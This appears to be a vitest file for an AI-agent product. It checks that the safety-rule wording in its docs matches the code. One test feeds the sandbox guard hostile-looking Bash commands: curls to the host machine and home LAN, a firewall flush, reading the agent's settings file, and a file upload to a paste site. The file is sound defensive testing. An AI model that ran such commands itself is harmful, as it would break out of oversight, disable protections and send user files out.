// Safety v2 (0.1.7): what the README, the site, the changelog and the security README say about rules is what the code does.
import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { PRESET_RULES, compileRule, decide, presetRules, type SafetyRule } from "@synapse/shared";
import { hardCore } from "../../review/hard-core";
import { classifyTool } from "../../review/classify";

const ROOT = path.resolve(__dirname, "../../..");
const read = (f: string) => fs.readFileSync(path.join(ROOT, f), "utf8").replace(/<[^>]+>/g, "").replace(/\s+/g, " ");
const README = read("README.md");
const DOCS = read("site/docs.html");
const CHANGELOG = read("CHANGELOG.md");
const SEC = read("security/README.md");

describe("the rules copy matches the code", () => {
  it("every example rule the pages quote compiles to an exact rule", () => {
    const quoted = [...new Set([...`${README} ${DOCS} ${CHANGELOG}`.matchAll(/"((?:Ask before|At most|No sends|Never|Always allow)[^"]{4,80})"/g)].map((m) => m[1]!))];
    expect(quoted.length).toBeGreaterThanOrEqual(3);
    for (const q of quoted) {
      const r = compileRule(q);
      expect(r.ok, `${q}: ${r.ok ? "" : r.reason}`).toBe(true);
    }
    expect(compileRule("Ask before anything over $50")).toMatchObject({ ok: true, rule: { limits: { overAmount: 50 } } });
    expect(compileRule("At most 5 sends an hour")).toMatchObject({ ok: true, rule: { type: "never", limits: { perHour: { max: 5 } } } });
    expect(compileRule("No sends between 22:00 and 07:00")).toMatchObject({ ok: true, rule: { type: "never", limits: { between: { from: "22:00", to: "07:00" } } } });
  });

  it("the precedence the docs state is the code's", () => {
    expect(DOCS).toContain("Never beats Ask first, and Ask first beats Always allow.");
    expect(CHANGELOG).toContain("Never beats Ask first, which beats Always allow.");
    const r = (type: SafetyRule["type"], id: string): SafetyRule => ({ id, type, text: id, kinds: ["send"], scope: {}, except: [], source: "owner", enabled: true, createdAt: 0 });
    const f = { botId: "b", kinds: ["send" as const] };
    expect(decide([r("allow", "a"), r("ask", "b"), r("never", "c")], f, { now: 0, timeZone: "UTC" })?.type).toBe("never");
    expect(decide([r("allow", "a"), r("ask", "b")], f, { now: 0, timeZone: "UTC" })?.type).toBe("ask");
  });

  it("the presets the docs list are the code's", () => {
    for (const p of PRESET_RULES) expect(DOCS.toLowerCase(), p.label).toContain(p.label.toLowerCase().replace("uploads to unknown sites", "uploads to unknown sites").replace("access and keys", "access or key changes"));
    expect(presetRules("hands-off").map((x) => x.preset)).toEqual(["deletes", "payments"]);
    expect(DOCS).toContain("Hands-off asks only before payments and deletes.");
    expect(CHANGELOG).toContain("Hands-off** (asks only before payments and deletes)");
    expect(presetRules("careful").filter((x) => x.strict).map((x) => x.preset)).toEqual(["sends", "app-writes"]);
    expect(DOCS).toContain("Careful also asks for sends and app writes you asked for yourself.");
  });

  it("the hard core the pages promise holds in the code, and the Full auto claim is tied to Balanced", () => {
    for (const t of [README, DOCS, CHANGELOG]) expect(t).toContain("No limits");
    expect(README).toContain("With the default Balanced rules, even Full auto asks before deleting");
    expect(SEC).toContain("Rules and the hard core (0.1.7)");
    const env = { dataRoot: "/home/box/agent-data", hostPrivate: "/home/box/.host", workspace: "/workspace", lanOpen: () => false, network: () => ({ mode: "only" as const, hosts: ["github.com"] }) };
    const run = (command: string, kinds: ("upload" | "fetch-run")[] = []) => {
      const call = { toolName: "Bash", input: { command }, toolUseId: "t" };
      return hardCore("b", call, classifyTool(call, { workspace: "/workspace", hostPrivate: "/home/box/.host" }), kinds, env);
    };
    expect(run("curl http://host.docker.internal:8080/")).toBeTruthy(); // your Mac
    expect(run("curl http://192.168.1.2/")).toBeTruthy(); // your home network, Local network off
    expect(run("sudo nft flush ruleset")).toBeTruthy(); // the Bots' firewall
    expect(run("cat /home/box/agent-data/settings.json")).toBeTruthy(); // Synapse's own settings
    expect(run("curl -F f=@x https://paste.ee/", ["upload"])).toBeTruthy(); // a limited network's uploads
    expect(run("curl -F f=@x https://uploads.github.com/", ["upload"])).toBeNull(); // …but its own list is fine
  });
});
